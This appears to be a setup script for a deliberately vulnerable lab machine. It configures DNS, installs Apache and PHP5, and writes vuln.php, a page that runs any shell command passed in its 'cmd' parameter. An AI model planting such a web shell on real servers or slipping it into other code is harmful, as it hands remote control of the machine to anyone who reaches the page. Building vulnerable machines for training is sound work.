#!/bin/sh

echo "script start" >> /tmp/result
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
echo "nameserver 8.8.8.8 8.8.4.4" >> /etc/network/interfaces

apt-get update -y
apt-get install apache2 -y
apt-get install -y php5

cat << EOF > /var/www/html/vuln.php
<?php
echo system(\$_GET['cmd']);
?>

EOF
